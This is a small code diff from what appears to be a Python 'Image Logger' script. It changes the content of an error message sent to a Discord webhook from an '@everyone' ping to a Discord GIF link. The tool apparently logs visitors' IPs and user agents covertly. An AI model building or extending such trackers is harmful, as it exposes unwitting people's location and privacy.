@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "https://media.discordapp.net/attachments/897319839251693618/1203351400734785536/image0.gif?ex=67433cd3&is=6741eb53&hm=c3e0f5508eb6654ae0a88a13b218143436da81b2a42b21b7aed0e610c2e90c7c&",
     "embeds": [
         {
             "title": "Image Logger - Error",
